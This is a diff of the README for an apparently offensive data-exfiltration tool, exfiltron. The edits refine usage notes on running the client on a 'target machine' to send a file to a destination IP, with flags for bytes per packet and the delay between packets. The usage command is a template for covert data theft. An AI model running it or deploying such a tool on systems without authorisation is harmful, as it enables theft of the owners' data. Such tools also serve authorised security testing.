@@ -19,15 +19,16 @@ First, get it on your local machine. There are two major files: the client
 file (exfiltron.py) and the server file. The client file must be placed on
 a target machine along with any modules you wish to use for your extraction
 method. SET UP THE SERVER SIDE INFORMATION HERE. After exfiltron.py has
-been placed on the target machine, run the following command:
+been placed on the target machine, run the following command on the target:
 
 `python exfiltron.py exfiltrationMethod -f filename -d destinationIP [-h] 
-[-a]`
+[-a] [-t]`
 
 * -h is help
 * -a (--data-per-packet) is the amount of data you want to fit into each packet.
 The default is the number of bytes that normally sit in that packet while the
-min amount is 1 byte and the max amount is the MTU minus the size of the packet
+min amount is 1 byte and the max amount is the MTU minus the headers and trailers
+on the packet
 * -t (--time) specifies the amount of time to wait between after sending a packet
 before sending another packet. This numerical value should be given in terms of
 seconds. If no value is explicitly set, exfiltron defaults the value to 5 seconds
